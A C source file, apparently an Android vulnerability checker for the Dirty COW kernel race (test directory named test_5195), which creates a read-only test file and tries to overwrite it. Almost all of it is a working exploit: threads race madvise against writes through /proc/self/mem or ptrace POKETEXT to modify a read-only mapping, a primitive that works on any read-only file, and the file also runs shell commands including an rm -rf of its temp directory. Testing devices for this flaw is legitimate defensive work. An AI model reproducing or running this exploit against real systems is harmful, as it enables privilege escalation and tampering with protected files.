#include <err.h>
#include <errno.h>
#include <assert.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/ptrace.h>
/* global variables and macros */
#define VULNERABLE 7
#define NOT_VULNERABLE 22
#define ERROR -1
#define OK 0

#define LOOP 0x1000000
#define TIMEOUT 1000

pid_t pid;

struct mem_arg
{
    void *offset;
    void *patch;
    off_t patch_size;
    const char *fname;
    volatile int stop;
    volatile int success;
};

static void *checkThread(void *arg)
{
    struct mem_arg *mem_arg;
    mem_arg = (struct mem_arg *)arg;
    struct stat st;
    int i;
    char *newdata = malloc(mem_arg->patch_size);
    for (i = 0; i < TIMEOUT && !mem_arg->stop; i++)
    {
        int f = open(mem_arg->fname, O_RDONLY);
        if (f == -1)
            break;
        if (fstat(f, &st) == -1)
        {
            close(f);
            break;
        }
        read(f, newdata, mem_arg->patch_size);
        close(f);

        int memcmpret = memcmp(newdata, mem_arg->patch, mem_arg->patch_size);
        if (memcmpret == 0)
        {
            mem_arg->stop = 1;
            mem_arg->success = 1;
            goto cleanup;
        }
        usleep(100 * 1000);
    }

cleanup:
    if (newdata)
        free(newdata);

    mem_arg->stop = 1;
    return 0;
}

static void *madviseThread(void *arg)
{
    struct mem_arg *mem_arg;
    size_t size;
    void *addr;
    int i, c = 0;

    mem_arg = (struct mem_arg *)arg;
    size = mem_arg->patch_size;
    addr = (void *)(mem_arg->offset);

    for (i = 0; i < LOOP && !mem_arg->stop; i++)
        c += madvise(addr, size, MADV_DONTNEED);

    mem_arg->stop = 1;
    return 0;
}

static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
{
    const unsigned char *s;
    unsigned long value;
    unsigned char *d;

    d = dest;
    s = src;

    while (n >= sizeof(long))
    {
        memcpy(&value, s, sizeof(value));
        if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1)
        {
            warn("ptrace(PTRACE_POKETEXT)");
            return ERROR;
        }

        n -= sizeof(long);
        d += sizeof(long);
        s += sizeof(long);
    }

    if (n > 0)
    {
        d -= sizeof(long) - n;

        errno = 0;
        value = ptrace(PTRACE_PEEKTEXT, pid, d, NULL);
        if (value == -1 && errno != 0)
        {
            warn("ptrace(PTRACE_PEEKTEXT)");
            return ERROR;
        }

        memcpy((unsigned char *)&value + sizeof(value) - n, s, n);
        if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1)
        {
            warn("ptrace(PTRACE_POKETEXT)");
            return ERROR;
        }
    }

    return 0;
}

static void *ptraceThread(void *arg)
{
    struct mem_arg *mem_arg;
    mem_arg = (struct mem_arg *)arg;

    int i, c;
    for (i = 0; i < LOOP && !mem_arg->stop; i++)
        c = ptrace_memcpy(pid, mem_arg->offset, mem_arg->patch, mem_arg->patch_size);

    mem_arg->stop = 1;
    return NULL;
}

int canwritetoselfmem(void *arg)
{
    struct mem_arg *mem_arg;
    mem_arg = (struct mem_arg *)arg;
    int fd = open("/proc/self/mem", O_RDWR);
    int returnval = -1;
    lseek(fd, (off_t)mem_arg->offset, SEEK_SET);
    if (write(fd, mem_arg->patch, mem_arg->patch_size) == mem_arg->patch_size)
        returnval = 0;

    close(fd);
    return returnval;
}

static void *procselfmemThread(void *arg)
{
    struct mem_arg *mem_arg;
    int fd, i, c = 0;
    mem_arg = (struct mem_arg *)arg;

    fd = open("/proc/self/mem", O_RDWR);

    for (i = 0; i < LOOP && !mem_arg->stop; i++)
    {
        lseek(fd, (off_t)mem_arg->offset, SEEK_SET);
        c += write(fd, mem_arg->patch, mem_arg->patch_size);
    }

    close(fd);

    mem_arg->stop = 1;
    return NULL;
}

static void exploit(struct mem_arg *mem_arg)
{
    pthread_t pth1, pth2, pth3;

    mem_arg->stop = 0;
    mem_arg->success = 0;

    if (canwritetoselfmem(mem_arg) == -1)
    {
        pid = fork();
        if (pid)
        {
            pthread_create(&pth3, NULL, checkThread, mem_arg);
            waitpid(pid, NULL, 0);
            ptraceThread((void *)mem_arg);
            pthread_join(pth3, NULL);
        }
        else
        {
            pthread_create(&pth1, NULL, madviseThread, mem_arg);
            ptrace(PTRACE_TRACEME);
            kill(getpid(), SIGSTOP);
            pthread_join(pth1, NULL);
        }
    }
    else
    {
        pthread_create(&pth3, NULL, checkThread, mem_arg);
        pthread_create(&pth1, NULL, madviseThread, mem_arg);
        pthread_create(&pth2, NULL, procselfmemThread, mem_arg);
        pthread_join(pth3, NULL);
        pthread_join(pth1, NULL);
        pthread_join(pth2, NULL);
    }
}

int check(int argc, char **argv)
{
    int ret = 0;
    const char *fromfile = argv[1];
    const char *tofile = argv[2];

    struct mem_arg mem_arg;
    struct stat st;
    struct stat st2;

    int f = open(tofile, O_RDONLY);
    if (f == -1)
    {
        ret = ERROR;
        goto cleanup;
    }
    if (fstat(f, &st) == -1)
    {
        ret = ERROR;
        goto cleanup;
    }

    int f2 = open(fromfile, O_RDONLY);
    if (f2 == -1)
    {
        ret = ERROR;
        goto cleanup;
    }
    if (fstat(f2, &st2) == -1)
    {
        ret = ERROR;
        goto cleanup;
    }

    size_t size = st2.st_size;
    if (st2.st_size != st.st_size)
    {
        if (st2.st_size <= st.st_size)
            size = st.st_size;
    }

    mem_arg.patch = malloc(size);
    if (mem_arg.patch == NULL)
    {
        ret = ERROR;
        goto cleanup;
    }

    mem_arg.patch_size = size;
    memset(mem_arg.patch, 0, size);

    mem_arg.fname = argv[2];

    read(f2, mem_arg.patch, size);
    close(f2);

    void *map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
    if (map == MAP_FAILED)
    {
        ret = ERROR;
        goto cleanup;
    }

    mem_arg.offset = map;

    exploit(&mem_arg);

    close(f);
    f = -1;
    if (mem_arg.success == 1)
        ret = VULNERABLE;
    else
        ret = NOT_VULNERABLE;

cleanup:
    if (f > 0)
        close(f);
    if (mem_arg.patch)
        free(mem_arg.patch);

    return ret;
}

int main(int argc, char **argv)
{
    char rm_cmd[] = "rm -rf /data/local/tmp/test_5195/";
    char mkdir_cmd[] = "mkdir /data/local/tmp/test_5195/";
    char create_from[] = "echo vulnerable_5195 > /data/local/tmp/test_5195/from.dat";
    char create_to[] = "echo not_vulner_5195 > /data/local/tmp/test_5195/to.dat";
    char chmod_to[] = "chmod 444 /data/local/tmp/test_5195/to.dat";
    system(rm_cmd);
    system(mkdir_cmd);
    system(create_from);
    system(create_to);
    system(chmod_to);
    char from_file[] = "/data/local/tmp/test_5195/from.dat";
    char to_file[] = "/data/local/tmp/test_5195/to.dat";
    char *myargv[3] = {argv[0], from_file, to_file};
    return check(3, myargv);
}